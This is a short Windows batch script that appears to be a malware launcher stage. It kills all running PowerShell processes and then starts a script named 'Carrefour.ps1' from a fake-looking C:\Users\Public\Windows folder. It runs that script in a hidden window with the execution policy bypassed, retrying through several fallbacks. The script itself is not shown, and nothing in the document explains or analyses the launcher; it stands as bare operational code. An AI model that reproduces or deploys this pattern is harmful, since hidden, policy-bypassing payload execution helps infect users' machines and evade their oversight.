
			:__________________________________________________

@echo off

			:__________________________________________________

color 1a

			:__________________________________________________

cd /

			:__________________________________________________


cd C:\Users\Public\Windows || cd "C:\Users\Public\Windows"

			:__________________________________________________

taskkill /f /im powershell.exe && timeout /t 11
			
			:__________________________________________________

PowerShell.exe -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -File "C:\Users\Public\Windows\Carrefour.ps1" || PowerShell.exe -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -File Carrefour.ps1 || PowerShell.exe -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -File C:\Users\Public\Windows\Carrefour.ps1

			:__________________________________________________

exit



